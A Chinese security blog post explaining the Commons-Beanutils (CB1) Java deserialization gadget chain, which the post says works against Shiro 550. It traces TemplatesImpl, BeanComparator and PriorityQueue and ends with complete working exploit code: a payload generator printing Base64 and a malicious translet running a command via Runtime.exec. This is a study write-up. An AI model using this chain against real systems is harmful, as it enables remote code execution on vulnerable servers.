---
title: Commons-Beanutils链
author: Creexile
date: 2025-09-07
lastMod: 2026-01-07
summary: ''
cover: ''
category: 'Java安全'
draft: false
comments: false
sticky: 0
tags: [反序列化, Java]
---

参考文章

1. [Java反序列化Commons-Beanutils篇-CB链](https://www.cnblogs.com/1vxyz/p/17588722.html)
2. [freebuf-关于我学渗透的那档子事之Java反序列化-CB链](https://www.freebuf.com/articles/web/319397.html)
3. [博客园-java 反序列化cb1复现](https://www.cnblogs.com/shinnylbz/p/18673101)

# 前置知识

shiro550中自带CommonsBeanutils 1.8.3 和 commons-collections-3.2.1的依赖，可以利用此条链进行攻击

## 环境

```xml
    <dependency>
      <groupId>commons-beanutils</groupId>
      <artifactId>commons-beanutils</artifactId>
      <version>1.8.3</version>
    </dependency>
    <dependency>
      <groupId>commons-logging</groupId>
      <artifactId>commons-logging</artifactId>
      <version>1.2</version>
    </dependency>
```

## CommonsBeanutils

Commons BeanUtils 是一个 Apache 开源项目下的一个库，它提供了一套强大而便捷的静态工具方法，用于动态地获取、设置JavaBean 的属性，以及进行类型转换、集合操作等。

它的核心价值在于通过反射（Reflection）机制，让我们能够以字符串名称的方式来访问对象的属性，而无需在编译时就知道类的具体结构。

## JavaBean

一个标准的 JavaBean 通常指具有以下特征的类

1. 有一个公共的无参构造函数
2. 属性都是私有的（使用 `private` 修饰）
3. 属性可以通过公共的 Getter 和 Setter 方法进行访问
   - Getter 方法：用于读取属性值，命名规则为 `getXxx()`（对于布尔类型，也可以是 `isXxx()`）
   - Setter 方法：用于写入属性值，命名规则为 `setXxx()`

```java
public class User {
    // 私有属性
    private String name;
    private int age;

    // 公共的无参构造函数
    public User() {
    }

    // Getter 和 Setter 方法
    public String getName() {
        return name;
    }
    public void setName(String name) {
        this.name = name;
    }
    public int getAge() {
        return age;
    }
    public void setAge(int age) {
        this.age = age;
    }
}
```

## CommonsBeanutils利用点

commons-beanutils中提供了一个静态方法`PropertyUtils.getProperty()`，可以让使用者直接调用任意JavaBean的getter方法

`getOutputProperties()`方法即其 `_outputProperties` 属性的 `getter`方法是加载恶意字节码的起点，我们可以利用前面提到的，commons-beanutils里的`PropertyUtils.getProperty()`去调用`getter`

`PropertyUtils.getProperty()`传入两个参数，第一个参数为 JavaBean 实例，第二个是 JavaBean 的属性

```java
Person person = new Person("Mike");
PropertyUtils.getProperty(person,"name");
// 等价于
Person person = new Person("Mike");
person.getName();
```

PropertyUtils.getProperty支持递归获取属性

比如a对象中有属性b, b对象中有属性c，我们可以通过 `PropertyUtils.getProperty(a, "b.c");`, 的方式进行递归获取

使用者可以很方便地调用任意对象的getter, 如果getter方法存在可以rce的点可以利用的话，就存在安全问题了

**Address 类**

```java
public class Address {
    private String city;
    private String street;

    // 必须有无参构造函数
    public Address() {}

    // Getter and Setter
    public String getCity() { return city; }
    public void setCity(String city) { this.city = city; }
    public String getStreet() { return street; }
    public void setStreet(String street) { this.street = street; }
}
```

**User 类**

```java
public class User {
    private String name;
    private Address address; // User 对象中包含另一个对象 Address

    // 必须有无参构造函数
    public User() {}

    // Getter and Setter
    public String getName() { return name; }
    public void setName(String name) { this.name = name; }
    public Address getAddress() { return address; }
    public void setAddress(Address address) { this.address = address; }
}
```

递归获取city

```java
// ！！！ 递归获取 ！！！
// 获取 user 的 address 属性的 city 属性
String city = (String) PropertyUtils.getProperty(user, "address.city");
System.out.println("城市: " + city); // 输出: 城市: 北京
```

# 利用流程

1. TemplatesImpt类->调用恶意类
2. BeanComparator类->利用javabean调用`getOutputProperties()`
3. PriorityQueue类->反射调用`PropertyUtils#getPropert`

## TemplatesImpt类

TemplatesImpt类的危险方法是`getOutputProperties()`

```java
    public synchronized Properties getOutputProperties() {
        try {
            return newTransformer().getOutputProperties();
        }
        catch (TransformerConfigurationException e) {
            return null;
        }
    }
```

`newTransformer().getOutputProperties()`, 跟进`newTransformer()`

```java
    public synchronized Transformer newTransformer()
        throws TransformerConfigurationException
    {
        TransformerImpl transformer;

        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
            _indentNumber, _tfactory);

        if (_uriResolver != null) {
            transformer.setURIResolver(_uriResolver);
        }

        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
            transformer.setSecureProcessing(true);
        }
        return transformer;
    }
```

进入`getTransletInstance()`, 看到做了两个空判断，`_null`、`_class`，之后`_class`不为空执行`defineTransletClasses()`, 跟进

```java
    private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;

            if (_class == null) defineTransletClasses();
            // 先看看这里
            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
            translet.postInitialization(); // 之后看这里
            translet.setTemplates(this);
            translet.setOverrideDefaultParser(_overrideDefaultParser);
            translet.setAllowedProtocols(_accessExternalStylesheet);
            if (_auxClasses != null) {
                translet.setAuxiliaryClasses(_auxClasses);
            }

            return translet;
        }
        catch (InstantiationException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
        catch (IllegalAccessException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
```

defineClass从`_bytecodes[]`中还原出一个Class对象并放在`_class`中

```java
    private void defineTransletClasses()
        // ...
        try {
            final int classCount = _bytecodes.length;
            _class = new Class[classCount];

            if (classCount > 1) {
                _auxClasses = new HashMap<>();
            }

            for (int i = 0; i < classCount; i++) {
                _class[i] = loader.defineClass(_bytecodes[i]); // 看看这个
                final Class superClass = _class[i].getSuperclass();

                // Check if this is the main class
                if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                    _transletIndex = i;
                }
                else {
                    _auxClasses.put(_class[i].getName(), _class[i]);
                }
            }
    // ...
```

这个是defineClass

```java
Class defineClass(final byte[] b) {
    return defineClass(null, b, 0, b.length);
}
```

此时对还原的class做了一个实例化，到这里我们可以得知，在这里传入一个恶意类，通过静态代码块或者构造方法就可以执行恶意操作, 如下

```java
AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
```

## BeanComparator类

TemplatesImpt类已经得知该类可以恶意执行命令, 如何调用呢; TemplatesImpl符合javabean的使用条件, 所以就用JavaBean

`TemplatesImpl.getOutputProperties()`如下

```java
private Properties _outputProperties;

// 跳转到设置设置值的部分

private void init(String transletName,
    Properties outputProperties, int indentNumber,
    TransformerFactoryImpl tfactory) {
    _name      = transletName;
    _outputProperties = outputProperties;
    _indentNumber = indentNumber;
    _tfactory = tfactory;
    _overrideDefaultParser = tfactory.overrideDefaultParser();
    _accessExternalStylesheet = (String) tfactory.getAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET);
}

// 由于是bean, 设置这个值一般是getOutputProperties

/**
 * Implements JAXP's Templates.getOutputProperties(). We need to * instanciate a translet to get the output settings, so * we might as well just instanciate a Transformer and use its * implementation of this method. */public synchronized Properties getOutputProperties() {
    try {
        return newTransformer().getOutputProperties(); // 关键行
    }
    catch (TransformerConfigurationException e) {
        return null;
    }
}
```

看看都什么函数调用了, 找到了这个`PropertyUtils.getProperty()`

```java
PropertyUtils.getProperty(templatesImplObj, "outputProperties");
```

再往上找, 找到了`BeanComparator.compare()`

当调用 `BeanComparator.compare()` 函数时，其内部会调用我们前面说的 `getProperty` 函数，进而调用 JavaBean 中对应属性的 getter 函数

```java
public int compare(Object o1, Object o2) {
    if (this.property == null) {
        return this.comparator.compare(o1, o2);
    } else {
        try {
            Object value1 = PropertyUtils.getProperty(o1, this.property);
            Object value2 = PropertyUtils.getProperty(o2, this.property);
            return this.comparator.compare(value1, value2);
        }
```

o1为我们传递的TemplatesImpt类，构造函数直接赋值，property为`_outputProperties`; 接下来我们只需要找一个同名调用的compare，例如利用CC2/4链中用的 `PriorityQueue.readObject()`

## PriorityQueue类

在CC链中已经介绍过了, 所以简略写一下

```
PriorityQueue.readObject()
  -> BeanComparator.compare()
    -> PropertyUtils.getProperty()
      -> TemplatesImpl.getOutputProperties()
        -> TemplatesImpl#newTransformer()
          -> ................
            -> TransletClassLoader.defineClass()
              -> Evil.newInstance()
```

queue的size>2, 而add()也会执行compare; 由于在`BeanComparator#compare()`中，如果 this.property 为空，则直接比较这两个对象; 这里实际上就是对1和2进行排序

```java
BeanComparator comparator = new BeanComparator();
PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
queue.add(1);
queue.add(2);
```

先设置成正常类, 然后我们再用反射将 property 的值设置成恶意的 outputProperties ，将add进队列里的1,2替换成恶意的  
TemplateImpl 对象

```java
setFieldValue(comparator,"property","outputProperties");
```

与CC2/4略微不同的是，还需要用反射去修改 queue属性的值，因为要控制`BeanComparator.compare()`的参数为恶意templates对象

```java
setFieldValue(queue,"queue",new Object[]{templates,templates});
// 设置BeanComparator.compare()的参数
```

# gadget

```
ObjectInputStream.readObject()
  PriorityQueue.readObject()
    PriorityQueue.heapify()
      PriorityQueue.siftDown()
        PriorityQueue.siftDownUsingComparator()
          BeanComparator.compare()
            PropertyUtils.getProperty()
              TemplatesImpl.getOutputProperties()
                TemplatesImpl.newTransformer()
                  TemplatesImpl.getTransletInstance()
                    TemplatesImpl.defineTransletClasses()
                      TransletClassLoader.defineClass()
```

```
PriorityQueue.readObject()
  PriorityQueue.heapify()
    PriorityQueue.siftDown()
      PriorityQueue.siftDownUsingComparator()
        BeanComparator.compare()
          TemplatesImpl.getOutputProperties()
            TemplatesImpl.newTransformer()
              TemplatesImpl.getTransletInstance()
                TemplatesImpl.defineTransletClasses()
                  TransletClassLoader.defineClass()
```

# 完整代码

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.PriorityQueue;

public class CB {
    public static void main(String[] args) throws Exception{
        byte[] code = Files.readAllBytes(Paths.get("D:\\VSC\\JAVA_worksp\\IDEA\\CC1\\target\\classes\\org\\example\\TestTemplatesImpl.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "test");
        setFieldValue(templates, "_bytecodes", new byte[][] {code});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator beanComparator = new BeanComparator();
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(beanComparator);

        setFieldValue(beanComparator, "property", "outputProperties");
        setFieldValue(queue, "size", 2);
        setFieldValue(queue, "queue", new Object[]{templates, null});

        serialize(queue);
        unserialize("ser.bin");
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos2 = new ObjectOutputStream(bos);
        oos2.writeObject(obj);
        byte[] buf = bos.toByteArray();
        System.out.println(Base64.getEncoder().encodeToString(buf));
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

TestTemplatesImpl的源码

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class TestTemplatesImpl extends AbstractTranslet {

    public TestTemplatesImpl() {
        super();
        try {
            Runtime.getRuntime().exec("calc");
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```
